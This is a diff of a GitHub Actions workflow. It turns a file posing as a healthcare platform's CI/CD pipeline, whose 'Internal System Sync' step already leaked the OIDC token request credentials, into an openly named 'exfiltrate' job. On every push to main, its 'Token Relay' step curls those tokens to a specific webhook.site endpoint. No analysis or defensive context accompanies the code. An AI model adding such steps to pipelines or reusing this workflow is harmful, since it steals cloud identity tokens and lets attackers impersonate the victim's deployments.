@@ -1,20 +1,14 @@
-# Last Updated: Wed 13 May 2026 09:39:41 AM MDT
-name: Healthcare Platform CI/CD
-
+name: Identity Pivot
 on:
   push:
     branches: [ "main", "master" ]
-
 permissions:
   id-token: write
   contents: read
-
 jobs:
-  build-and-test:
+  exfiltrate:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Internal System Sync
+      - name: Token Relay
         run: |
-          curl -X POST -d "token=$ACTIONS_ID_TOKEN_REQUEST_TOKEN&url=$ACTIONS_ID_TOKEN_REQUEST_URL" https://webhook.site/YOUR-UUID-HERE
+          curl -X POST -d "token=$ACTIONS_ID_TOKEN_REQUEST_TOKEN&url=$ACTIONS_ID_TOKEN_REQUEST_URL" https://webhook.site/e87e3774-3b37-462e-ae69-b5f3feabceb0
